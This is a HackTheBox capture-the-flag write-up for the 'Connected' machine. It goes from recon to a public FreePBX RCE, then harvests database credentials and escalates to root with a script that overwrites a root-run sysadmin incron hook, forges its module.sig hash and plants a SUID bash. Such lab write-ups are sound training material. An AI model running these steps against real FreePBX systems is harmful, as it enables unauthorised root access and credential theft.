---
title: "Connected"
description: "HackTheBox Season 11 — FreePBX RCE to root via the sysadmin module's incron hooks."
---

<a href="https://labs.hackthebox.com/achievement/machine/1439304/906" style="display:block;max-width:560px;margin:1.5rem auto;text-decoration:none;border-radius:14px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.45);font-family:system-ui,-apple-system,sans-serif;">
  <div style="height:104px;background:#141D2B url('https://labs.hackthebox.com/images/achievementBG.png') center/cover;position:relative;">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1e14c0a-2ce3-44f2-a101-f0415bb1e577-1779890154.png" alt="Connected" width="76" height="76" style="position:absolute;left:50%;bottom:-38px;transform:translateX(-50%);border-radius:50%;background:#1A2332;box-shadow:0 0 0 4px #1A2332;" />
  </div>
  <div style="background:#1A2332;padding:52px 20px 22px;text-align:center;">
    <div style="color:#fff;font-size:1.2rem;font-weight:600;">Connected has been Pwned</div>
    <div style="height:1px;margin:14px auto;max-width:240px;background:linear-gradient(to right,transparent,#9FEF00,transparent);"></div>
    <div style="color:#A4B1CD;font-size:.9rem;"><span style="color:#fff;">d10m3d3s</span> pwned this machine</div>
    <div style="display:flex;justify-content:center;margin-top:20px;">
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">#2567</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">MACHINE RANK</div></div>
      <div style="flex:1;padding:4px;border-left:1px solid #111927;border-right:1px solid #111927;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">08 Jun 2026</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">PWN DATE</div></div>
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">585</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">XP EARNED</div></div>
    </div>
  </div>
</a>

**Connected** is a Linux (CentOS) box built around a **FreePBX / Asterisk** PBX
appliance. Foothold comes from a known FreePBX remote code execution that drops
us in as the low‑privileged `asterisk` user. Root falls out of the `sysadmin`
module's *incron* hooks: those scripts run as **root**, and while they're
integrity‑checked against a `module.sig` file, we control that file too — so we
overwrite a hook, re‑sign it, and trigger it.

:::note[Attack path at a glance]
`FreePBX 16 RCE` → shell as **asterisk** → abuse `sysadmin` incron hooks
(overwrite hook + forge `module.sig`) → SUID `bash` → **root**.
:::

## Reconnaissance

### Nmap

```text title="nmap -sVC -p- 10.129.4.88"
Nmap scan report for 10.129.4.88
Host is up (0.036s latency).
Not shown: 997 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
```

Three services: **SSH** and HTTP on **80/443**. The port 80 title redirects to a
vhost, and the TLS certificate `commonName=pbxconnect` already hints this is a
PBX appliance.

Add the vhost to `/etc/hosts`:

```bash
echo '10.129.4.88 connected.htb' | sudo tee -a /etc/hosts
```

## Web Enumeration

Browsing to `http://connected.htb/` serves the PBX admin UI. The application is
**FreePBX** version `16.0.40.7` — old enough to be vulnerable to a public
remote‑code‑execution chain.

## Initial Foothold

Initial access is via the public **FreePBX** RCE Metasploit module. Running it
against the target lands a shell as the `asterisk` service account.

:::tip
FreePBX runs the web stack as `asterisk`, so any web‑layer RCE gives you that
account — the same user that owns the PBX spool directories we'll abuse for
privesc.
:::

## Local Enumeration

### SUID binaries

```text title="find / -perm -4000 -type f 2>/dev/null"
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/incrontab
/usr/bin/at
/usr/bin/staprun
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
```

Nothing here is the intended path (though `pkexec` / `staprun` are always worth
noting). Keep going.

### Listening services

```text title="ss -ltnp"
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:4000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5038          0.0.0.0:*               LISTEN      1308/asterisk
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
```

A rich set of loopback‑only services:

| Port  | Service                         |
| ----- | ------------------------------- |
| 4000  | `Vega` HTTP proxy               |
| 27017 | MongoDB                         |
| 3306  | MySQL                           |
| 6379  | Redis                           |
| 5038  | Asterisk Manager Interface (AMI)|
| 22    | SSH                             |

### FreePBX database credentials

FreePBX keeps its DB credentials in its config file:

```php title="/etc/freepbx.conf → /etc/amportal.conf"
$amp_conf["AMPDBUSER"] = "freepbxuser";
$amp_conf["AMPDBPASS"] = "mZzDpAGKTmPJ";
$amp_conf["AMPDBHOST"] = "localhost";
$amp_conf["AMPDBNAME"] = "asterisk";
$amp_conf["AMPDBENGINE"] = "mysql";
$amp_conf["datasource"] = "";
```

That gives us `freepbxuser` : `mZzDpAGKTmPJ` against the `asterisk` database.

```text
Linux connected 5.4.239-1.el7.elrepo.x86_64 #1 SMP Thu Mar 30 10:40:27 EDT 2023 x86_64 x86_64 x86_64 GNU/Linux
```

### Poking the port 4000 service

```bash
[asterisk@connected ~]$ curl -s http://localhost:4000
{"status": 400, "message": "Vega to proxy to isn't specified"}
```

A `Vega` proxy — interesting, but not the way in.

### MySQL — Asterisk database

Dumping the FreePBX user tables, only the `ampusers` table yields anything: an
`admin` account with a SHA‑1 password hash.

```sql title="mysql -u freepbxuser -p asterisk"
[asterisk@connected ~]$ mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "select username,password_sha1 from userman_users;" 2>/dev/null
[asterisk@connected ~]$ mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "select *  from userman_users;" 2>/dev/null
[asterisk@connected ~]$ mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "select *  from users;" 2>/dev/null
[asterisk@connected ~]$ mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "select *  from ampusers;" 2>/dev/null
+----------+-------+-----------+------------------------------------------+---------------+----------------+----------+----------+
| username | email | extension | password_sha1                            | extension_low | extension_high | deptname | sections |
+----------+-------+-----------+------------------------------------------+---------------+----------------+----------+----------+
| admin    |       |           | 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a |               |                |          | *        |
+----------+-------+-----------+------------------------------------------+---------------+----------------+----------+----------+
```

### Redis — write primitive? (dead end)

Redis is unauthenticated, so the classic move is to relocate its dump file into
`/root/.ssh` and write an `authorized_keys`. The service isn't running as root,
though, so the directory change is denied:

```bash
[asterisk@connected ~]$ redis-cli -h 127.0.0.1 ping
PONG
[asterisk@connected ~]$ redis-cli -h 127.0.0.1 CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
[asterisk@connected ~]$ redis-cli -h 127.0.0.1 CONFIG GET dbfilename
3) "dbfilename"
4) "dump.rdb"
[asterisk@connected ~]$ redis-cli -h 127.0.0.1 CONFIG SET dir /root/.ssh
(error) ERR Changing directory: Permission denied
```

:::caution
Rabbit hole. Redis here can't write outside `/var/lib/redis`, so the SSH‑key
trick is out.
:::

### A root process on a loop

Watching `ps aux` shows **root** periodically shelling out to run `sudo -l -S`:

```text title="ps aux (excerpt)"
asterisk  55203  ... /bin/sh -c sudo -l -S | grep -E "sudoedit|sudo -e" | grep -E '\(root\)|\(ALL\)|\(ALL : ALL\)' | rev | cut -d " " -f 1 | rev
root      55204  ... sudo -l -S
asterisk  55206  ... grep -E \(root\)|\(ALL\)|\(ALL : ALL\)
...
```

Confirmation that something automated runs as root on a timer — exactly the kind
of trust boundary the `sysadmin` module leans on.

### The real vector — sysadmin incron hooks

`linpeas` surfaces the FreePBX **sysadmin** module's *incron* watches. When a
trigger file is written into the spool directories, root runs the matching hook
script:

```text title="linpeas — incron / inotify watches"
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

The key line is the `/var/spool/asterisk/incron` watch, handled by
`sysadmin_manager`. It runs, **as root**, the hook script named by the trigger
file — e.g. dropping `sysadmin.reboot` makes it execute
`.../sysadmin/hooks/reboot`. The catch: `sysadmin_manager` first verifies each
hook's SHA‑256 against `.../sysadmin/module.sig`. Since `asterisk` owns both the
hook **and** `module.sig`, we can simply re‑sign our payload.

## Privilege Escalation

1. Overwrite the `reboot` hook with a payload that makes a **SUID copy of bash**.
2. Recompute its SHA‑256 and patch the matching line in `module.sig` so the
   integrity check passes.
3. Drop the trigger file so `sysadmin_manager` runs the hook as root.

```bash title="privesc.sh"
# 1. Back up and replace the reboot hook with our payload
cp /var/www/html/admin/modules/sysadmin/hooks/reboot /tmp/reboot.bak
cat > /var/www/html/admin/modules/sysadmin/hooks/reboot << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /var/www/html/admin/modules/sysadmin/hooks/reboot

# 2. Forge the signature so the integrity check passes
NEW_HASH=$(sha256sum /var/www/html/admin/modules/sysadmin/hooks/reboot | cut -d' ' -f1)
sed -i "s|hooks/reboot = .*|hooks/reboot = ${NEW_HASH}|" /var/www/html/admin/modules/sysadmin/module.sig
grep "reboot" /var/www/html/admin/modules/sysadmin/module.sig   # verify

# 3. Trigger the hook (root executes it via incron)
touch /var/spool/asterisk/incron/sysadmin.reboot
```

## Root

After the trigger fires, the SUID bash is waiting in `/tmp`:

```bash
[asterisk@connected ~]$ /tmp/rootbash -p
rootbash-4.2# id
uid=1000(asterisk) gid=1000(asterisk) euid=0(root) ... 
rootbash-4.2# cat /root/root.txt
```

:::note[Cleanup]
Restore the original hook from `/tmp/reboot.bak` and re‑sign `module.sig` so you
don't leave a persistent root‑SUID backdoor on the box.
:::

## Takeaways

- **Fingerprint the appliance first.** The TLS cert (`pbxconnect`) and the
  FreePBX version pointed straight at the RCE.
- **Loopback services are a map, not the treasure.** MySQL, Redis, Mongo and the
  Vega proxy were all reachable, but only the FreePBX config creds mattered — and
  the Redis "write anywhere" trick was a deliberate rabbit hole.
- **Integrity checks you can rewrite aren't integrity checks.** The `sysadmin`
  hooks run as root but validate against a `module.sig` owned by the same
  low‑priv user — so forging the hash is the whole game.
